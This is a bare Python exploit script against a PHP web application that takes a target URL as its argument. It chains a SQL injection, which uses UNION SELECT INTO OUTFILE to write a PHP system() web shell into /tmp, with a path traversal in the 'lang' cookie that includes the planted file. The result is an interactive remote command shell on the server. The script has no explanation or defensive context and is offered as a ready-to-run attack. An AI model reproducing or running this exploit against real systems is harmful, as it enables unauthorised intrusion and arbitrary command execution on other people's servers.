import requests
import re, sys, cmd, uuid

filename = str(uuid.uuid4())
if len(sys.argv) < 2:
	print(f"[+] Run python {sys.argv[0]} url/index.php")
	sys.exit()

s = requests.Session()

# comment
params = {
	'id': f'1000 union select "<?php echo system($_GET[\'cmd\']);;" INTO OUTFILE \'/tmp/{filename}.html\'',
}

# proxies = {
# 	'http': 'http://127.0.0.1:8080'
# }
s.get(sys.argv[1])
res = s.get(sys.argv[1], params=params, verify=False)
cookies = dict(s.cookies.items())

class shell(cmd.Cmd):
	prompt= 'cmd> '

	def default(self, line: str):
			headers = {
				'Cookie': f"lang=../../../../../tmp/{filename}"    
			}
			pram = { 'cmd': f'{line}'}
			res = s.post(url=sys.argv[1], params=pram, headers=headers, verify=False)
			pattern = r"(?<=body>)((.|\n)*)"
			cmp = re.compile(pattern)
			data = cmp.findall(res.text)[0][0].split('<div')[0]
			print(data)

if __name__ == "__main__":
	shell().cmdloop()
